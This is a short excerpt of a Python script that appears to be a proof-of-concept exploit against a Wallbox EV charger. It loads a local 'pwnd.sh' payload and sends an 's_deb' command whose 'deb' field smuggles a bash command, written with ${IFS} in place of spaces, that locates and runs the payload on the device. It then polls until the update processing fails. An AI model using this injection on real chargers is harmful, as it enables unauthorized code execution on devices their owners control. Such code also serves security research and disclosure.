...
async def main():
    ...
    payload = open("pwnd.sh", "rb").read()
    md5 = hashlib.md5(payload).hexdigest()

    await wb.execute("s_deb", {"deb":";bash${IFS}$(find${IFS}$HOME${IFS}-name${IFS}*pwnd*${IFS}-type${IFS}f);","md5":md5,"size":str(len(payload))})
    ...
    print("Waiting for Wallbox processing to fail...")
    while True:
        hup_data = await wb.execute("r_hup")
        if hup_data.get('st') == "fail":
            break
